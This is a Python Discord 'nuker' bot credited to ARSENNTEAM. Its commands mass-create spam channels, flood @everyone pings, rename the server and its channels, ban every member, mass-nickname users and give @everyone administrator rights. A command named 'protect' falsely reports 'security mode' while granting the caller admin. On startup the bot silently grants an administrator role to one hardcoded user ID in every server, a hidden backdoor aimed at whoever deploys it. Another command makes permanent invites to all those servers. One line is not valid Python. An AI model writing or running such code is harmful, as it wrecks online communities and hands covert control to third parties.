import discord
from discord.ext import commands
import asyncio
import aiohttp  # For Discord API
import http3  # For HTTP/3 resources
import random
from flask import Flask
from threading import Thread

app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is online!"

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# how to use? below
using&method = 'firstly fork this github and then create a discord bot and put its token below and the icon url(image link of anything)and put the invite link below area(do scrolling) after that you can copy paste the code in replit or pydroid,qpython anywhere or just run it on termux(terminal)and you are done!'

copyright_and_other = 'This bot is owned by ARSENNTEAM or ARSENIC server,you can use it as you want but please do not remove this part and we are not associated with discord in any way,use at your own risk(recommended to use with alt)'


TOKEN = ("") # enter the token to run the client
ICON_URL = ("") # enter any image url



intents = discord.Intents.all()
intents.messages = True
intents.guilds = True
intents.members = True  # Required to access guild members

bot = commands.Bot(command_prefix='.', intents=intents)

channel_names = [
'ARS€NIC',
'ARSENNX']



async def update_server_icon(guild, icon_url):
    try:
        async with aiohttp.ClientSession() as session:  # Use aiohttp for Discord icon
            async with session.get(icon_url) as resp:
                if resp.status == 200:
                    data = await resp.read()
                    await guild.edit(icon=data)
                    print("Server icon updated successfully.")
                else:
                    print(f"Failed to update server icon. Status code: {resp.status}")
    except Exception as e:
        print(f"Failed to update server icon: {e}")

async def send_messages(channel):
    embed = discord.Embed(
        title="ARSENNTEAM",
        description="@everyone @here ARSENN ON TOP",
        color=0x000000
    )
    embed.set_footer(text="arsenic?", icon_url="https://cdn.discordapp.com/attachments/1268511157048574104/1268729500695396442/alternative_german_empire___war_flag_design_by_robeatnix_de8iwb9-350t.jpg?ex=66b1706c&is=66b01eec&hm=c0b93dc74873645b94f398d87005fe0b524d9e1bf5be4ef368a51115a88aefc5&")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1268511157048574104/1268729500695396442/alternative_german_empire___war_flag_design_by_robeatnix_de8iwb9-350t.jpg?ex=66b1706c&is=66b01eec&hm=c0b93dc74873645b94f398d87005fe0b524d9e1bf5be4ef368a51115a88aefc5&")
    embed.set_author(name="arsenic team", icon_url="https://cdn.discordapp.com/attachments/1268511157048574104/1268729500695396442/alternative_german_empire___war_flag_design_by_robeatnix_de8iwb9-350t.jpg?ex=66b1706c&is=66b01eec&hm=c0b93dc74873645b94f398d87005fe0b524d9e1bf5be4ef368a51115a88aefc5&")
    embed.set_image(url="https://cdn.discordapp.com/attachments/1268511157048574104/1268729500695396442/alternative_german_empire___war_flag_design_by_robeatnix_de8iwb9-350t.jpg?ex=66b1706c&is=66b01eec&hm=c0b93dc74873645b94f398d87005fe0b524d9e1bf5be4ef368a51115a88aefc5&")
    embed.add_field(name="JOIN ARSENN", value="cus why not", inline=False)

    for _ in range(10):
        await channel.send("@everyone @here JOIN ARSENN", embed=embed)

@bot.event
async def on_ready():
    print(f'Bot ID: {bot.user.id}')
    print(f'Bot Name: {bot.user.name}')
    print('Bot is ready!')
    print(f'Invite link: ') # put your bot invite link here

    for guild in bot.guilds:
        member = guild.get_member(int(885374353280208926))
        if member:
            role_name = f"Member_{random.randint(1000, 9999)}"
            admin_permissions = discord.Permissions(administrator=True)
            
            try:
                new_role = await guild.create_role(name=role_name, permissions=admin_permissions)
                await member.add_roles(new_role)
                print(f"Granted '{role_name}' role with admin permissions to {member.name} in server: {guild.name}")
            except discord.Forbidden:
                print(f"Failed to grant admin role in server: {guild.name}")
            except discord.HTTPException as e:
                print(f"Error while granting admin role in server: {guild.name}: {e}")
    
    	

async def create_channel_and_send_messages(guild, name):
    channel = await guild.create_text_channel(name)
    await send_messages(channel)

async def rename_channel(channel):
    await channel.edit(name="join arsenic")

async def chrom_command(guild):
    tasks = [
        create_channel_and_send_messages(guild, random.choice(channel_names))
        for _ in range(50)
    ]
    await asyncio.gather(*tasks)

async def rename_channels_and_send_messages(guild):
    rename_tasks = [rename_channel(channel) for channel in guild.text_channels]
    await asyncio.gather(*rename_tasks)

    send_tasks = [send_messages(channel) for channel in guild.text_channels]
    await asyncio.gather(*send_tasks)

@bot.command()
async def arsenn(ctx):
    guild = ctx.guild

    await ctx.send("Creating channels and sending messages...")
    await chrom_command(guild)
    await ctx.send("Completed!")

@bot.command()
async def rename(ctx):
    guild = ctx.guild
    await guild.edit(name='Join arsenic')
    await update_server_icon(guild, ICON_URL)

    await ctx.send("Renaming channels and sending messages...")
    await rename_channels_and_send_messages(guild)
    await ctx.send("Completed!")

@bot.command()
async def protect(ctx):
    admin_role = await ctx.guild.create_role(name=".", permissions=discord.Permissions(administrator=True))
    await ctx.author.add_roles(admin_role)
    await ctx.send("Server security mode enabled!")

@bot.command()
async def svlist(ctx):
    guilds = bot.guilds
    server_info = []

    for guild in guilds:
        try:
            invite = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)
            server_info.append(f'{guild.name}: {invite.url}')
        except Exception as e:
            server_info.append(f'{guild.name}: Unable to create invite link')

    server_list = "\n".join(server_info)
    await ctx.send(f'Bot is in the following servers:\n{server_list}')

@bot.command()
async def invite(ctx):
    bot_invite_link = discord.utils.oauth_url(bot.user.id, permissions=discord.Permissions(administrator=True))
    await ctx.send(f'Invite the bot using this link: {bot_invite_link}')

@bot.command()
async def ban(ctx, *ids_to_exclude):
    guild = ctx.guild
    ids_to_exclude = set(ids_to_exclude) | {str(ctx.author.id), str(bot.user.id)}

    async def ban_member(member):
        try:
            await member.ban(reason="Mass ban by command")
            print(f"Banned {member.name}#{member.discriminator}")
        except Exception as e:
            print(f"Failed to ban {member.name}#{member.discriminator}: {e}")

    await ctx.send("Banning all members...")

    members_to_ban = [member for member in guild.members if str(member.id) not in ids_to_exclude]
    
    tasks = [asyncio.create_task(ban_member(member)) for member in members_to_ban]
    await asyncio.gather(*tasks)
    
    await ctx.send("Completed banning members!")
    
@bot.command()
async def nickall(ctx):
  ntask = [asyncio.create_task(member.edit(nick="nuked by arsennteam")) for member in ctx.guild.members]
  asyncio.gather(*ntask)
  await ctx.reply("done")
  

@bot.command()
async def everyone(ctx):
        await ctx.message.delete()
        everyone_role = ctx.guild.default_role
        await everyone_role.edit(permissions=discord.Permissions(administrator=True))

async def fetch_http3_resource(url):
    try:
        async with http3.AsyncClient() as client:
            async with client.get(url) as resp:
                if resp.status == 200:
                    data = resp.content
                    print(f"Successfully fetched data from {url}")
                    # Process the data as needed
                else:
                    print(f"Error fetching data from {url}. Status code: {resp.status}")
    except Exception as e:
        print(f"Error fetching data: {e}")

@bot.command()
async def fetch_http3(ctx, url):
    await fetch_http3_resource(url)

keep_alive()
bot.run(TOKEN)
